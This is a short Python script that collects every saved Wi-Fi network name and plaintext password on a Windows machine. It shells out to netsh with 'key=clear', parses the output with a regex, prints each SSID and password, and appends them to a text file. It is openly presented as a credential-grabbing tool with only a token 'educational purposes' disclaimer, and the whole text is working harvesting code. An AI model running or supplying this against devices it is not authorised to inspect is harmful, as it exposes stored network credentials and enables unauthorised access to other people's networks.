#!/usr/bin/env python3

'''
allYourWifi belong to me! Gather the SSIDs and passwords of all wireless access points a windows device
has been connected to. Must be run from an Admin account. This is obviously for educational purposes only

- Horrorclause
'''

import os
import re


netshCom = os.popen("netsh wlan show profiles")
wifiList = netshCom.read().split('\n')
wifiList = [x for x in wifiList if "All User Profile" in x]

# Regex pattern to identify all characters following": " for SSIDs
regPattern = "(?<=:\s)(.*)"

wifiComplete = {}
ssids = []

# Pulls the SSIDs
for x in wifiList:
	m = re.search(regPattern, x)
	if m:
		ssids.append(m.group(0))
	else:
		print("nothing found")

# Pulls the password for the associated SSID and adds to dictionary "wifiComplete"
for i in ssids:
	i = '"{}"'.format(i)
	data = os.popen("netsh wlan show profile {} key=clear".format(i)).read().split('\n')
	data = [x for x in data if "Key Content" in x]
	for k in data:

		if "Key Content" in k:
			reg = re.search(regPattern, k)
			if reg:
				wifiComplete[i] = reg.group(0)
				print("SSID: ", i, '  Password: ', reg.group(0), ' added to dictionary')

		else:
			print("No key content found for {}".format(k))

# Write the saved dictionary to a txt file
with open("wifiPass.txt", 'a') as f:
	for k, v in wifiComplete.items():
		f.write("{} :  {}\n".format(k, v))

